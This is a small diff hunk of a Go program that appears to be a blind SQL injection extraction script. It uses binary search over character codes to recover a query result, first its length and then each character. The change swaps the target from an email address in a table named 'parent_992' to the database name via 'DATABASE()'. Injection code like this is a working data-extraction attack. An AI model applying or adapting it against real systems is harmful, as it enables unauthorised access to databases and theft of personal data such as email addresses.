@@ -105,7 +105,7 @@ type foundChar struct {
 func main() {
 	startTime := time.Now() // Start timing the whole program
 
-	query := "select email from parent_992 limit 1"
+	query := "DATABASE()"
 
 	// Find the length of the result string so we can know how many characters to extract
 	lengthCharCode := binarySearch(fmt.Sprintf("LENGTH(%s)", query), 1, 48, 57)
